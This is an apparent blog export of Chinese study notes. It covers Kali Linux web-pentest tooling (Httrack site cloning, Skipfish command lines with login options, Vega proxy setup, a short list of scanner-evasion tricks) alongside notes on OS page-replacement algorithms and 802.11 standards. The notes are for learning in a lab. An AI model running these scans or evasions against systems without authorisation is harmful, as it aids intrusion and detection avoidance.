<li>Prepend long random string–优先考虑长随机字符串</li>
<li>Fake parameter–参数欺骗</li>
<li>TAB as request space–使用TAB作为命令的分隔符</li>
<li>Change the case of the URL–使用变化的URL</li>
<li>Use Windows directory separator()–使用Windows路径分隔符”&quot;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Cookie获取：
Firefox浏览器，可以通过Firbug option网络抓包，Net，然后Cookie，可通过d-debug mod查看设置的cookie是否生效
User Agent：
Firefox的默认UserAgent：Default User Agent → Default User Agent（每个浏览器可以进行独立设置）</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十六)：Web渗透实验环境及工具</title>
    <url>/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AD)%EF%BC%9AWeb%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<hr>
<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
<li>Metasploitable（访问浏览器Metasploitable的网页）<ul>
<li>Dvwa（不同级别Low → Medium → High）</li>
</ul>
</li>
</ul>
<h4 id="2-侦察"><a href="#2-侦察" class="headerlink" title="2. 侦察"></a>2. 侦察</h4><ul>
<li>Httrack<ul>
<li>对目标网站的克隆复制</li>
<li>减少与目标系统交互</li>
</ul>
</li>
<li>Httrack<ul>
<li>Enter Project name</li>
<li>Base path（要ms拷贝的目录，大目录）</li>
<li>Enter URLs（起始路劲）</li>
<li>Action（一般选Mirror Web Site with Wizard）</li>
<li>Proxy</li>
<li>wildcard（定义通配符）</li>
<li>Additional options（其余选项） </li>
<li>Ready to launch the mirror</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>可选择的Action：
Mirror Web Site：镜像网页站点
Mirror Web Site with Wizard：网页向导
Just Get file Indicated：获得某种类型的文件
Mirror ALL links in URLs（Multiple Mirror）：镜像所有连接
Test Links In URLs（Bookmark Test）：只测试连接
▲ 代理可以通过 Hide My Ass来进行掩藏（可能需要代理Proxy List）</code></pre></blockquote>
<h4 id="3-扫描工具"><a href="#3-扫描工具" class="headerlink" title="3. 扫描工具"></a>3. 扫描工具</h4><ul>
<li>Nikto（纯主动扫描工具）</li>
<li>Vega</li>
<li>Skipfish</li>
<li>W3af</li>
<li>Arachni</li>
<li>Owasp-zap</li>
</ul>
<blockquote>
<pre><code>Web扫描工具模式
1.代理截断模式：代理扫描截断
2.主动扫描模式：主动扫描，注入代码
▲ 自动扫描相对于手动扫描，更容易找到隐藏的页面，能提高很大的效率，但容易触发警报</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十九)：Skipfish</title>
    <url>/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish/</url>
    <content><![CDATA[<hr>
<h4 id="1-skipfish"><a href="#1-skipfish" class="headerlink" title="1. skipfish"></a>1. skipfish</h4><ul>
<li>C语言编写（Google开发）</li>
<li>实验性的主动web安全评估工具（相比于商业扫描器不遑相让）</li>
<li>基于Web Application进行扫描</li>
<li>递归爬网</li>
<li>基于字典的探测</li>
<li>速度较快<ul>
<li>多路单线程，全异步网络I/O，消除内存管理和调度开销</li>
<li>启发式自动内容识别</li>
</ul>
</li>
<li>误报较低</li>
</ul>
<h4 id="2-skipfish"><a href="#2-skipfish" class="headerlink" title="2. skipfish"></a>2. skipfish</h4><ul>
<li><strong><code>🔺命令：skipfish -o（存放工作目录） test http://1.1.1.1</code></strong></li>
<li><strong><code>🔺命令：skipfish -o test @url.txt</code></strong></li>
<li><strong><code>🔺命令：skipfish -o test -S（指定只读字典）complet.wl -W（写成新的字典） a.wl http://1.1.1.1  #字典</code></strong></li>
<li>参数<ul>
<li>-I：只检查包含’string’的URL</li>
<li>-X：不检查包含’string’的URL  #logout</li>
<li>-K：不对指定参数进行Fuzz测试</li>
<li>-D：跨站点爬取另外一个域（有连接则会跳过去爬取 ）</li>
<li>-l：每秒最大请求数</li>
<li>-m：每IP最大并发连接数</li>
<li>–config：指定配置文件</li>
</ul>
</li>
<li>身份认证（http认证）<ul>
<li><strong><code>🔺命令：skipfish -A（http身份认证信息） user:pass -o test http://1.1.1.1</code></strong></li>
</ul>
</li>
<li>身份认证（Cookie认证）    <ul>
<li><strong><code>🔺命令：skipfish -C（Cookie信息）&quot;name=var&quot; -o test http://1.1.1.1</code></strong></li>
</ul>
</li>
<li>身份认证参数（表单认证） <ul>
<li>–auth-form <URL> </li>
<li>–auth-user-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
<li>–auth-user <username> （提交表单的用户名）</li>
<li>–auth-pass-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
<li>–auth-pass <password>  （提交表单的密码）</li>
<li>–auth-verify-url <URL> （提交成功后显示的界面）</li>
<li>–auth-form-target <URL>（通过form里面的action确定）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>表单代码名可通过查看界面源代码元素去获得，查看表单设置的属性</code></pre></blockquote>
<ul>
<li>扫描结束太快<ul>
<li>触发了目标站点的连接数限制，降低-m -l数值</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十八)：Vega</title>
    <url>/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AB)%EF%BC%9AVega/</url>
    <content><![CDATA[<hr>
<h4 id="1-vega（纯界面化）"><a href="#1-vega（纯界面化）" class="headerlink" title="1. vega（纯界面化）"></a>1. vega（纯界面化）</h4><ul>
<li><p>Kali 2.0以上无此软件，需要下载： <a href="https://subgraph.com/vega/download/index.en.html" target="_blank" rel="noopener">https://subgraph.com/vega/download/index.en.html</a></p>
<blockquote>
<pre><code>▲ 2019.12.24软件需要java 8 openjdk
▲ 2019.12.24在Windows安装运行成功
▲ 2019.12.24在Kali上运行报错</code></pre></blockquote>
</li>
<li><p>JAVA编写的开源Web扫描器</p>
</li>
<li><p>扫描模式</p>
</li>
<li><p>代理模式</p>
</li>
<li><p>爬站、处理表单、注入测试</p>
</li>
<li><p>支持SSL：<a href="http://vega/ca.crt（在代理模式下进行访问）" target="_blank" rel="noopener">http://vega/ca.crt（在代理模式下进行访问）</a></p>
</li>
</ul>
<blockquote>
<pre><code>代理模式：
Web Client → Proxy Server（可截断修改） → Web Server

▲ 代理服务器，一般用于手动漏洞挖掘，可代替客户端进行扫描

爬站：
主动扫描阶段：刚开始的手动提交少提交有攻击性代码的内容
代理扫描阶段：通过字典以及代理服务器发送大量请求进行爬站（Fuzz）

vega比较集中关注Web Application方面的漏洞，比较少关注软件，Web Server方面的漏洞，相对比较集中在程序员编写代码方面的漏洞</code></pre></blockquote>
<h4 id="2-vega基本参数配置"><a href="#2-vega基本参数配置" class="headerlink" title="2. vega基本参数配置"></a>2. vega基本参数配置</h4><ul>
<li>Window → Preferences → General<ul>
<li>SOCKS proxy/External HTTP proxy</li>
<li>General → Appearance（界面显示方式，默认）</li>
<li>General → Updates（自动更新，默认）</li>
</ul>
</li>
<li>Window → Preferences → Proxy（vega自提供代理）<ul>
<li>Default User-Agent（默认，可删除vega标识）</li>
<li>Override client User-Agent（默认）</li>
<li>Prevent browser caching（访问服务器每次发送新的请求，默认）</li>
<li>Prevent Intermediate（proxy）caching（阻止代理缓存，默认）</li>
<li>Listener（vega本机监听网络地址，提供多个代理给局域网）</li>
</ul>
</li>
<li>Window → Preferences → Scanner<ul>
<li>Debug → Log all scanner requests（记录扫描记录，默认）</li>
<li>Debug → Display debug output in console（显示详细扫描信息，默认）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ vega最主要的是，vega自带的代理（IP地址:端口）
▲ 无论是Proxy还是Scanner，都需要设置Target，Target Scope：Base Paths/Exclude（URL or pattern）
▲ autoproxt设置vega代理模式：IP：端口</code></pre></blockquote>
<h4 id="3-vega使用"><a href="#3-vega使用" class="headerlink" title="3. vega使用"></a>3. vega使用</h4><ul>
<li>Proxy（Target Scope）</li>
<li>Scanner（Target Scope+Cookie）</li>
<li>Intercept（vega支持很不友好，可能存在bug）</li>
</ul>
<blockquote>
<pre><code>vega是自签名证书，可能会存在别方的地址劫持（别的地方的自签名证书），可以在官方上下载Vega的自签名证书，然后安装到浏览器上
火狐查看证书信息：右键 → View Page Info → Security → View Certificate

▲ 证书颁发是给域名的，不是给IP地址的</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章、页面置换算法</title>
    <url>/2019/12/24/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="第三章、页面置换算法"><a href="#第三章、页面置换算法" class="headerlink" title="第三章、页面置换算法"></a>第三章、页面置换算法</h2><hr>
<ol>
<li><p>最优页面置换算法（OPT）</p>
<ul>
<li>基本思想：当一个缺页中断发生时，对于保存在内存当中的每一个逻辑页面，计算在它的下一次访问之前，还需等待多长时间，从中选择等待时间最长的那个，作为被置换的页面</li>
<li>这只是一种理想情况。在实际系统中是无法实现的，因为操作系统无从知道每一个页面要等待多长时间以后才会再次访问</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 可用作其他算法的性能评价的依据（在一个模拟器上运行某个程序，并记录每一次的页面访问情况，在第二遍运行时即可使用最优算法）</code></pre></blockquote>
<ol start="2">
<li><p>先进先出算法（First-in-First-out，FIFO）</p>
<ul>
<li>基础思想：选择在内存中驻留时间最长的时间的页面并淘汰之。具体来说，系统维护着一个链表，记录了所有位于内存当中的逻辑页面。从链表的排列顺序来看，链首页面驻留的时间最长，链尾页面驻留时间最短。当发生一个缺页中断时，把链首页面淘汰出局，并把新的页面添加到链表的末尾</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 性能较差，调出的页面有可能时经常要访问的页面，并且有Belady现象。FIFO算法很少单独使用</code></pre></blockquote>
<ol start="3">
<li><p>最近最久未使用算法（Least Recently Used，LRU）</p>
<ul>
<li>基本思路：当一个缺页中断发生时，选择最久未使用的那个页面，并淘汰</li>
<li>两种实现方式：<ul>
<li>系统维护一个页面链表，最近刚刚使用过地页面作为首终点，最久未使用地页面作为尾结点。每一次访问内存时，找到相应地页面，把它从链表中摘下来，再移动到链表之首。每次缺页中断发生时，淘汰链表末尾地页面</li>
<li>设置一个活动页面栈，当访问某页时，将此页号压入栈顶，然后，考察栈内是否有此页面相同地页号，若有则抽出。当需要淘汰一个页面时，总是选择栈底的底面，它就是最久未使用的</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 它是对最优页面置换算法的一个近似，其依据是程序的局部性原理，即在最近一小段时间（最近几条指令）内，如果某些页面被频繁地访问，那么在将来地一小段时间内，它们还可能会再一次被频繁地访问。反过来说，如果在过去某些页面长时间未被访问，那么在将来它们还可能会长时间地得不到访问</code></pre></blockquote>
<ol start="4">
<li><p>时钟页面置换算法（硬件实现访问位置0/1）(Reigsident bit，used bit，frame number)</p>
<ul>
<li>Clock页面置换算法，LRU的近似，用一个bit来模拟，贴近最优的LRU，对FIFO的一种改进</li>
<li>基本思路：<ul>
<li>需要用到页表项当中的访问位，当一个页面被装入内存时，把该位初始化为0。然后如果这个页面被访问（读/写），则把该位置为1</li>
<li>把各个页面组织成环形链表（类似钟表面），把指针指向最老的页面（最先进来）</li>
<li>当发生一个缺页中断时，考察指针所指向的最老页面，若它的访问位为0，立即淘汰；若访问位为1，则把该位置为0，然后指针往下移动一格。如此下去，直到找到被淘汰的页面，然后把指针移动到它的下一格</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 维持一个环形页面链表保存在内存中
1.用一个时钟（或者使用/引用）位来标记一个页面是否经常被访问
2.当一个页面被引用的时候，这个位被设置（为1）

▲ 时钟头扫遍页面寻找一个带有user bit=0
替换在一个周转内没有被引用的页面</code></pre></blockquote>
<pre><code>func Clock_Replacement
begin 
while  (victim page not found)  do
    if  (used bit for current page=0)   then
            replace current page(&amp;set used bit to 1)
    else
            reset used bit(to 0)
   end if
   advance clock pointer
end while end Clock_Replacement</code></pre><ol start="5">
<li><p>二次机会法（Reigsident bit，used bit，dirty bit）</p>
<ul>
<li>这里有一个巨大的代价来替代”脏页“</li>
<li>修改Clock算法，使它允许脏页总是在一次时钟头扫描中保留下来</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>Before clock sweep                 After clock sweep
used    dirty                         used    dirty   
0          0                          replace page
0          1                          0          0
1          0                          0          0
1          1                          0          1
▲ 注释：同时使用脏位和使用位来指导置换</code></pre></blockquote>
<ol start="6">
<li><p>最不常用算法（Least Frequently Used，LFU）</p>
<ul>
<li>基本思想：当一个缺页中断发生时，选择访问次数最少的那个页面，并淘汰之</li>
<li>实现方法：对每个页面设置一个访问计算器，每当一个页面被访问时，该页面的访问计算器加1。在发生缺页中断时，淘汰计数值最小的那个页面。</li>
<li>LRU和LFU的区别：<ul>
<li>LRU考察的时多久未访问，时间越短越好</li>
<li>LFU考察的时访问次数或频度，访问次数越多越好</li>
</ul>
</li>
<li>问题：一个页面在进程开始时使用得很多，但以后就不使用了。实现也费时费力<ul>
<li>解决方法：定期把次数寄存器右移一位</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ Belady现象、FIFO、LRU和Clock的比较
1.Belady现象：在采用FIFO算法时，有时会出现分配的物理页面数增加，缺页率反而提高的异常现象
2.Belady现象的原因：FIFO算法的置换特征与进程访问内存的动态特征是矛盾的，与置换算法的目标是不一致的（即替换较少使用的页面），因此，被它置换出去的页面并不一定是进程不会访问的
3.LRU、FIFO和Clock的比较
(1)LRU算法和FIFO本质上都是先进先出的思路，只不过LRU是针对页面的最近访问时间来进行排序，所以需要在每一次页面访问的时候动态地调整各个页面之后的先后顺序（有一个页面的最近访问时间变了）；而FIFO是针对页面进入内存的时间来进行排序，这个时间是固定不变的，所以各页面之间的先后顺序是固定的。如果一个页面在进入内存后没有被访问，那么它的最近访问时间就是它进入内存的时间。换句话说，如果内存当中的所有页面都未曾访问，那么LRU算法退化为FIFO算法
(2)LRU算法性能较好，但系统开销较大；FIFO算法系统开销较小，但可能会发生Belady现象。因此，折衷的办法就是Clock算法，在每一次页面访问时，它不必去动态地调整该页面在链表当中的顺序，而仅仅是做一个标记，然后等到发生缺页中断的时候，再把它移动到链表末尾。对于内存当中那些未被访问的页面，Clock算法的表先和LRU算法一样好；而对于那些曾经被访问的页面，它不能像LRU算法那样，记住它们的精确位置</code></pre></blockquote>
<ol start="7">
<li><p>工作集</p>
<ul>
<li>工作集：一个进程当前正在使用的逻辑页面集合，可以用一个二元函数W（t，▲）来表示<ul>
<li>t是当前的执行时刻</li>
<li>▲称为工作集窗口（working-set window），即一个定长的页面访问的时间窗口</li>
<li>W（t，▲）=当前时刻t之前的▲时间窗口当中所有页面所组成的集合（随着t的变化，该集合也在不断地变化）</li>
<li>|W（t，▲）|指工作集地的大小，即页面数目</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 工作集大小的变化：进程开始执行后，随着访问新页面逐步建立稳定的工作集。当内存访问的局部性区域的位置大致稳定时，工作集大小也大致稳定；局部性区域的位置改变时，工作集快速扩张和收缩过渡到下一个稳定值</code></pre></blockquote>
<ol start="8">
<li><p>常驻集</p>
<ul>
<li>常驻集是指在当前时刻，进程实际驻留在内存当中的页面集合<ul>
<li>工作集是进程在运行过程中固有的性质，而常驻及取决于系统分配给进程的物理页面数目，以及所采用的页面置换算法；</li>
<li>如果一个进程的整个工作集都在内存当中，即常驻集被包含于工作集，那么进程将很顺利地运行，而不会造成太多地缺页中断（直到工作集发生剧烈变动，从而过渡到另一个状态</li>
<li>当进程常驻集的大小达到某个数目之后，再给它分配更多的物理页面，缺页率也不会明显下降</li>
</ul>
</li>
</ul>
</li>
<li><p>工作集页置换算法</p>
<ul>
<li>超出工作集就替换掉</li>
</ul>
</li>
<li><p>缺页率页面置换算法</p>
<ul>
<li>可变分配策略：常驻集大小可变。例如：每个进程在刚开始运行的时候，先根据程序大小给它分配一定数目的物理页面，然后再进程运行过程中，再动态地调整常驻集的大小<ul>
<li>可采用全局页面置换的方式，当发生一个缺页中断时，被置换的页面可以是在其他进程当中，各个并发进程竞争地使用物理页面</li>
<li>优缺点：性能较好，但增加了系统开销</li>
<li>具体实现：可以使用缺页率算法（PFF page of fault frequency）来动态调整常驻集的大小</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 缺页率：表示“缺页次数/内存访问次数”（比率）或“缺页的评级时间间隔的倒数”。</code></pre></blockquote>
<ul>
<li>影响缺页率的因素：<ul>
<li>页面置换算法</li>
<li>分配给进程的物理页面算法</li>
<li>页面本身的大小</li>
<li>程序的编写方法</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ 一个交替的工作集计算明确的视图最小化页缺失
1.当缺页率高的时候------增加工作集
2.当缺页率低的时候------减少工作集</code></pre></blockquote>
<pre><code>算法：
     保持追踪缺失发生概率
          1.当缺失发生时，从上次页缺失起计算这个时间记录这个使劲按，t（last）是上次的页缺失的时间
          2.如果发生页缺失之间的时间是“大”，之后减少工作集
          3.如果t（current）-t（last）&gt;T,之后从内存中移除所有在【t（last），t（current）】时间内没有被引用的页
          4.如果这个发生页缺失的时间是“小”，之后增加工作集
          5.如果t（current）-t（last）&lt;=T，之后增加缺失页到工作集中</code></pre><ol start="11">
<li><p>抖动问题（thrashing）</p>
<ul>
<li>如果分配给一个进程的物理页面太少，不能包含整个的工作集，集常驻集被包含于工作集，那么进程将会造成很多的缺页中断，需要频繁地在内存与外存之间替换页面，从而使进程的运行速度变得很慢，我们把这种状态称为“抖动”</li>
<li>产生的原因：随着驻留内存的进程数目增加，分配给每个进程的物理页面数不断减小，缺页率不断上升。所以OS要选择一个适当的进程数目和进程需要的帧数，以便在并发水平和缺页率之间达到一个平衡</li>
<li>抖动问题可能会被本地的页面置换改善<ul>
<li>更好的规则为加载控制：调整MPL，所以：Better criteria for load control：Adjust MPL so that：</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>▲ 平均缺页时间（MTBF）=页缺失服务时间（PFST）</code></pre></blockquote>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十四)：无线标准、基本概念以及运行模式</title>
    <url>/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%A0%87%E5%87%86%E3%80%81%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-无线渗透（WLAN，蓝牙等几米范围内）"><a href="#1-无线渗透（WLAN，蓝牙等几米范围内）" class="headerlink" title="1. 无线渗透（WLAN，蓝牙等几米范围内）"></a>1. 无线渗透（WLAN，蓝牙等几米范围内）</h4><ul>
<li>与其他章节独立，涵盖面广，可独立成课</li>
<li>无线技术变化快 难度大</li>
<li>既新鲜刺激又亚历山大<ul>
<li>我们不会研究很深</li>
</ul>
</li>
<li>一半理论 一半实践<ul>
<li>理论是本章最有价值的部分（aircrack-ng suite作者写的一本书）</li>
</ul>
</li>
<li>无线技术是本课程难度最大的一章<ul>
<li>协议结构</li>
</ul>
</li>
</ul>
<h4 id="2-无线技术特点（802-11标准）"><a href="#2-无线技术特点（802-11标准）" class="headerlink" title="2. 无线技术特点（802.11标准）"></a>2. 无线技术特点（802.11标准）</h4><ul>
<li>行业迅猛发展</li>
<li>互联网的重要入口</li>
<li>边界模糊</li>
<li>安全实施缺失而且困难</li>
<li>对技术不了解而造成配置不当</li>
<li>企业网络私自接入AP破坏网络边界</li>
</ul>
<h4 id="3-IEEE"><a href="#3-IEEE" class="headerlink" title="3. IEEE"></a>3. IEEE</h4><ul>
<li>Institute of Electrical and Electronics Engineers<ul>
<li>由通信航天生物电气电子等方面的科学家组成，目的是制定标准，指导行业技术的发展，目前成员近40万人</li>
</ul>
</li>
<li>IEEE分为不同的技术委员会（Committes），其中802委员会负责lan、man标准的制定<ul>
<li>以太网</li>
<li>令牌环网</li>
<li>无线局域网</li>
<li>网桥</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">Working Group</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">IEEE 802.1</td>
<td align="center">Bridging(networking) and Network Management</td>
</tr>
<tr>
<td align="center">IEEE 802.2</td>
<td align="center">LLC</td>
</tr>
<tr>
<td align="center">IEEE 802.3</td>
<td align="center">Ethernet（以太网）</td>
</tr>
<tr>
<td align="center">IEEE 802.4</td>
<td align="center">Token Bus</td>
</tr>
<tr>
<td align="center">IEEE 802.5</td>
<td align="center">Defines the MAC Layer for a Taken Ring（令牌环网）</td>
</tr>
<tr>
<td align="center">IEEE 802.6</td>
<td align="center">MANs（成域网）</td>
</tr>
<tr>
<td align="center">IEEE 802.7</td>
<td align="center">Broadband LAN Using Coaxial Cable（同轴电缆的宽带局域网）</td>
</tr>
<tr>
<td align="center">IEEE 802.8</td>
<td align="center">Fiber Optic TAG（光纤网）</td>
</tr>
<tr>
<td align="center">IEEE 802.9</td>
<td align="center">Integrated Services LAN（集成服务的局域网）</td>
</tr>
<tr>
<td align="center">IEEE 802.10</td>
<td align="center">Interoperable LAN Security</td>
</tr>
<tr>
<td align="center">IEEE 802.11 a/b/g/n</td>
<td align="center">Wireless LAN(WLAN) and Mesh(Wi-Fi Certification)</td>
</tr>
<tr>
<td align="center">IEEE 802.12</td>
<td align="center">100BaseVG</td>
</tr>
<tr>
<td align="center">IEEE 802.13</td>
<td align="center">Unusef</td>
</tr>
<tr>
<td align="center">IEEE 802.14</td>
<td align="center">Cable Modems</td>
</tr>
<tr>
<td align="center">IEEE 802.15</td>
<td align="center">Wireless PAN（无线个人局域网络）</td>
</tr>
</tbody></table>
<h4 id="4-无线（802-11标准）"><a href="#4-无线（802-11标准）" class="headerlink" title="4. 无线（802.11标准）"></a>4. 无线（802.11标准）</h4><ul>
<li>应用层</li>
<li>表示层</li>
<li>会话层</li>
<li>传输层</li>
<li>网络层</li>
<li><strong>数据链路层</strong><ul>
<li><strong>逻辑链路控制子层LLC</strong></li>
<li><strong>媒体访问控制子层MAC</strong></li>
</ul>
</li>
<li><strong>物理层</strong></li>
</ul>
<h4 id="5-IEEE-802-11标准"><a href="#5-IEEE-802-11标准" class="headerlink" title="5. IEEE 802.11标准"></a>5. IEEE 802.11标准</h4><ul>
<li>802委员会下第11组负责开发无线局域网标准</li>
<li>IEEE 802.11 The Original WLAN Standard–1Mibt/s and 2Mbit/w，2.4GHz RF and IR</li>
<li>IEEE 802.11a 54Mbit/s，5GHz</li>
<li>IEEE 802.11b 802.11 Enhancements to Support 5.5Mbit/s and 11Mbit/s</li>
<li>IEEE 802.11c Bridge Operation Procedures</li>
<li>IEEE 802.11d International（Country to Country）Roaming Extensions</li>
<li>IEEE 802.11e Quality of Service（QoS），Including Packet Bursting</li>
<li><strong>IEEE 802.11F Inter-Access Point Protocol</strong></li>
<li>IEEE 802.11g 54Mbit/s，2.4GHz</li>
<li>IEEE 802.11h Spectrum Managed 802.11a（5GHz）for European Compatibility</li>
<li>IEEE 802.11i Enhanced Security</li>
<li>IEEE 802.11j Extensions for Japan</li>
<li>IEEE 802.11k Radio Resource Measurement Enhancements</li>
<li>IEEE 802.11n Higher Throughput Using Multiple Input,Multiple Output（MIMO）Antennas</li>
<li>IEEE 802.11p Wireless Access for the Vehicular Environment（WAVE）</li>
<li>IEEE 802.11r Fast BSS Transition（FT）</li>
<li>IEEE 802.11s Mesh Networking，Extended Service Set（ESS）</li>
<li><strong>IEEE 802.11T Wireless Performance Prediction（WPP）</strong></li>
<li>IEEE 802.11u Internetworking with Non-802 Networks（i.e.:Cellular）</li>
<li>IEEE 802.11v Wireless Network Management</li>
<li>IEEE 802.11w Protected Management Frames</li>
<li>IEEE 802.11y 3650-3700 MHz Operation in the US</li>
<li>IEEE 802.11z Direct Link Setup（DLS）Extensions</li>
<li>IEEE 802.11mb Maintenance of the Standard</li>
<li>IEEE 802.11aa Robust Streaming of Audio Video Transport Streams</li>
<li>IEEE 802.11ac Very High Throughput &lt; 6GHz</li>
<li>IEEE 802.11ad Very High Throughput，60GHz</li>
<li>IEEE 802.11ae QoS Management</li>
<li>IEEE 802.11af TV Whitespace</li>
<li>IEEE 802.11ah Sub 1 GHz</li>
<li>IEEE 802.11ai Fast Initial Link Setup</li>
</ul>
<h4 id="6-日常使用"><a href="#6-日常使用" class="headerlink" title="6. 日常使用"></a>6. 日常使用</h4><ul>
<li>802.11 – The original WLAN standard</li>
<li>802.11a – Up to 54 Mbit/s on 5GHz</li>
<li>802.11b – 5.5Mbit/s and 11Mbit/s on 2.4GHz</li>
<li>802.11g – Up to 54Mbit/s on 2.4GHz.Backward compatible with 802.11b</li>
<li>802.11i – Provides enhanced security</li>
<li>802.11n – Provides higher throughput with Multiple Input/Multiple Output（MIMO）</li>
</ul>
<table>
<thead>
<tr>
<th align="center">Protocal</th>
<th align="center">Release Data</th>
<th align="center">Frequencise</th>
<th align="center">Rates</th>
<th align="center">Modulation</th>
<th align="center">Channel Width</th>
<th align="center">Notes</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Legacy</td>
<td align="center">1997</td>
<td align="center">2.4-25GHz</td>
<td align="center">1 or 2Mibt</td>
<td align="center">FHSS/DSSS</td>
<td align="center">1MHz/20MHZ</td>
<td align="center">No implementations were made for IR（红外线）</td>
</tr>
<tr>
<td align="center">802.11b(wifi)</td>
<td align="center">1999</td>
<td align="center">2.4-2.5GHz</td>
<td align="center">1,2,5.5,11Mbit</td>
<td align="center">DSSS</td>
<td align="center">22MHz</td>
<td align="center">Proprietary extension:up to 33Mbit</td>
</tr>
<tr>
<td align="center">802.11a</td>
<td align="center">1999</td>
<td align="center">5.15-5.25/5.25-5.35/5.725-5.875GHz</td>
<td align="center">6,9,12,18,24,36,48,54Mbit</td>
<td align="center">OFDM</td>
<td align="center">20MHz</td>
<td align="center">Proprietary extension: up to 108Mbit</td>
</tr>
<tr>
<td align="center">802.11g</td>
<td align="center">2003</td>
<td align="center">2.4-2.5GHz</td>
<td align="center">Same as 802.11a and 802.11b</td>
<td align="center">DSSS/OFDM</td>
<td align="center">20MHz/22MHz</td>
<td align="center">Propritary extension:180Mbit/125Mbit</td>
</tr>
<tr>
<td align="center">802.11n</td>
<td align="center">2009</td>
<td align="center">2.4 and /or 5GHz</td>
<td align="center">Up to 600Mbit</td>
<td align="center">DSSS/OFDM</td>
<td align="center">20/20 or 40 MHz</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="7-802-11"><a href="#7-802-11" class="headerlink" title="7. 802.11"></a>7. 802.11</h4><ul>
<li>发布于1997年</li>
<li>速率1Mbps或2Mbps</li>
<li>红外线传输介质（未实现，传输之间不能有障碍物）</li>
<li>无线射频信号编码（调制）（radio frequencies，民用2.4-5）<ul>
<li>Direct-Sequence Spread-Spectrum（DSSS）–直序扩频</li>
<li>Frequency Hopping Spread-Spectrum（FHSS）–跳频扩频</li>
</ul>
</li>
<li>媒体访问方式–CSMA/CA（载波侦听多路访问冲突避免） c=b+log2（1+s/n）<ul>
<li>根据算法侦听一定时长</li>
<li>发生数据前发包声明</li>
</ul>
</li>
<li>Request to Send/Clear to Send（RTS/CTS）</li>
</ul>
<h4 id="8-80211b"><a href="#8-80211b" class="headerlink" title="8. 80211b"></a>8. 80211b</h4><ul>
<li>Complementart Code Keying（CCK）–补充代码键<ul>
<li>5.5 and 11Mbit/s</li>
<li>2.4GHz band（2.4GHz-2.485GHz）</li>
<li>14个重叠的信道channels</li>
<li>只有三个完全不重叠的信道</li>
</ul>
</li>
<li>美国 1 to 11（2.412GHz–2.462GHz）</li>
<li>欧洲 1 to 13（2.412GHz–2.472GHz）</li>
<li>日本 1 to 14（2.412GHz–2.484GHz）</li>
</ul>
<blockquote>
<pre><code>No Overlap
1、6、11
2、7、12
3、8、13
左右偏移11个单位，同一空间内的AP选择的信道尽量不冲突</code></pre></blockquote>
<h4 id="9-802-11a"><a href="#9-802-11a" class="headerlink" title="9. 802.11a"></a>9. 802.11a</h4><ul>
<li>与802.11b几乎同时发布<ul>
<li>因设备价格问题一直没有得到广泛使用</li>
</ul>
</li>
<li>使用5GHz带宽<ul>
<li>2.4GHz带宽干扰源多（微波（特别明显）、蓝牙、无绳电话）</li>
<li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li>
<li>Orthogonal Frequency-Division Multiplexing（OFDM）信号调制方法（正交频分复用技术）</li>
</ul>
</li>
<li>更高速率54Mbps，每个信道20MHz带宽</li>
<li>变频<ul>
<li>5.15-5.35GHz室内</li>
<li>5.7-5.8GHz室外</li>
</ul>
</li>
</ul>
